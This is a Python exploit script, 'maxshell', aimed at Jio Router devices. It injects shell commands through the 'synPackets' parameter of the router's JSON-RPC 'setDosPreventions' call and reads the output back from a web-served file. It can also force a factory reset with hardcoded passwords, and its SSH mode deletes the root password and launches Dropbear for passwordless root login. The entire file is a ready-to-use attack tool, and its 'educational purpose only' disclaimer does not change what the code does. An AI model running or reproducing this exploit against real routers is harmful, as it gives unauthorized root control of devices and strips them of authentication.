#!/usr/bin/env python3
import requests, json, sys, time, readline, os, subprocess

urllib3 = __import__('urllib3'); urllib3.disable_warnings()
s = requests.Session(); s.verify = False; s.headers["Content-Type"] = "application/json"

hist = os.path.expanduser("~/.maxshell_history")
try: readline.read_history_file(hist)
except: pass
readline.set_history_length(500)

HELP = """
███╗   ███╗ █████╗ ██╗  ██╗███████╗██╗  ██╗███████╗██╗     ██╗              ██████╗  █████╗ ██████╗ ██████╗ ██╗   ██╗
████╗ ████║██╔══██╗╚██╗██╔╝██╔════╝██║  ██║██╔════╝██║     ██║              ██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
██╔████╔██║███████║ ╚███╔╝ ███████╗███████║█████╗  ██║     ██║     ███████╗ ██║  ██║███████║██║  ██║██║  ██║ ╚████╔╝ 
██║╚██╔╝██║██╔══██║ ██╔██╗ ╚════██║██╔══██║██╔══╝  ██║     ██║     ╚══════╝ ██║  ██║██╔══██║██║  ██║██║  ██║  ╚██╔╝  
██║ ╚═╝ ██║██║  ██║██╔╝ ██╗███████║██║  ██║███████╗███████╗███████╗         ██████╔╝██║  ██║██████╔╝██████╔╝   ██║   
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝         ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═════╝    ╚═╝   


[*] Educational purpose only. I am not responsible for any misuse.
[*] Works on Jio Router (IDU / All variants)
[*] Script Created by Mahendra Mali (Max) and Modified by THE_DIY_DADDY
[*] Ping at: https://mahendraplus.github.io and https://the-diy-daddy.github.io/
[*] Default SSH: root / "nothing"

Requirements:
  Python3
  and
  pip install requests
  pip install pyreadline3


Usage:
  python3 maxshell_daddy.py admin:"Admin@07"@192.168.31.1
  python3 maxshell_daddy.py admin:"Admin@07"@192.168.31.1 -ssh

Options:
  -c '
<cmd>'     Execute command and exit
  -ssh           Enable SSH on port 22 and connect
  -h             Show this help
"""

if "-h" in sys.argv or len(sys.argv) < 2:
    print(HELP); sys.exit(0)

a, i = {}, 1
while i < len(sys.argv):
    arg = sys.argv[i]
    if arg == "-h": print(HELP); sys.exit(0)
    elif arg == "-c" and i+1 < len(sys.argv): a["cmd"] = sys.argv[i+1]; i += 1
    elif arg == "-ssh": a["ssh"] = True
    elif ":" in arg and "@" in arg:
        u, r = arg.split(":", 1); p, h = r.rsplit("@", 1)
        a["u"]=u; a["p"]=p; a["h"]=h
    i += 1

if not all(k in a for k in ["u","p","h"]):
    print("[-] Use: maxshell.py username:password@ip"); sys.exit(1)

H, W, SSH_PASS = a["h"], f"https://{a['h']}/WCGI", "Admin@07"

def api_req(m, p=None):
    d = {"jsonrpc":"2.0","method":m}
    if p: d["params"] = p
    try: return s.post(W, json=d, timeout=10)
    except: return None

def api(m, p=None):
    r = api_req(m, p)
    if r is None: return {}
    return r.json()

def do_login(user, pw):
    s.cookies.clear()
    resp = api_req("login", {"username":user, "password":pw})
    if resp is None: return False, "Connection failed"
    r = resp.json()
    if r.get("forcedLogin") or r.get("status") == "OK":
        t = r["results"]["token"]
        s.headers["Authorization"] = f"Bearer {t}"
        s.cookies.set("sysauth", resp.cookies.get("sysauth",""), domain=H, path="/")
        li = r["results"].get("loggedId","")
        pl = {"authHeader":f"Bearer {t}"}
        if li: pl["loggedId"] = li
        api("postLogin", pl)
        return True, ""
    return False, r.get("message", "Login failed")

logged_in = True
def run(cmd):
    global logged_in
    tag = f"MAX{int(time.time()*1000000)%999999}X"
    payload = f"128;echo '{tag}' > /www/q.txt 2>&1;({cmd}) >> /www/q.txt 2>&1;"
    try:
        s.post(W, json={"jsonrpc":"2.0","method":"setDosPreventions",
            "params":{"synPacketStatus":True,"synPackets":payload}}, timeout=15)
    except:
        pass
    try:
        time.sleep(0.5)
        out = requests.get(f"https://{H}/q.txt", verify=False, timeout=5).text.strip()
        if out and tag in out:
            out = out.replace(tag + "\n", "").replace(tag, "")
            return out.strip()
    except:
        pass
    if logged_in:
        logged_in = False
    return ""

# ----- Normal mode (web shell) -----
ok, msg = do_login(a["u"], a["p"])
if not ok: print(f"[-] {msg}"); sys.exit(1)
logged_in = True

st = api("getSessionStatus").get("status")
if st != "OK":
    print("[!] Setup wait second....")
    api("setFactoryReset", {"adminPassword":"Admin@07","confirmAdminPassword":"Admin@07",
                           "guestPassword":"Guest@07","confirmGuestPassword":"Guest@07"})
    time.sleep(1)
    s = requests.Session(); s.verify=False; s.headers["Content-Type"]="application/json"
    ok2, msg2 = do_login("admin", "Admin@07")
    if not ok2: print(f"[-] {msg2}"); sys.exit(1)
    print(">>> Setup completed, login id: admin ; password: Admin@07")

if a.get("cmd"):
    c = a["cmd"]
    if c.strip() == "ls" or c.strip().startswith("ls "):
        if "-C" not in c and "-l" not in c: c = c.replace("ls", "ls -C", 1)
        if "--color" not in c: c = c.replace("ls", "ls --color=always", 1)
    print(run(c)); sys.exit(0)
    
if a.get("ssh"):
    print("[+] Starting Dropbear SSH server...")
    print(f"[*] Enabling SSH without PASS...")
    run("passwd -d root")
    run("killall dropbear")
    run("dropbear -B")
    time.sleep(3)
    print(f"[*] SSH without PASS Enabled.")
    time.sleep(1)
    print(f"[*] open CMD and run (ssh-keygen -R 192.168.31.1 && ssh root@192.168.31.1)")
    time.sleep(3)
    print(f"[*] ...................................")
    time.sleep(10)
    print(f"[*] Subscribe to THE_DIY_DADDY (YouTube CHANNEL)")
    time.sleep(1)
    print(f"[*] ...................................")
    time.sleep(5)
    print(f"[*] A SPECIAL THANKS to MAHENDRA MALI"); sys.exit(0)

readline.write_history_file(hist)
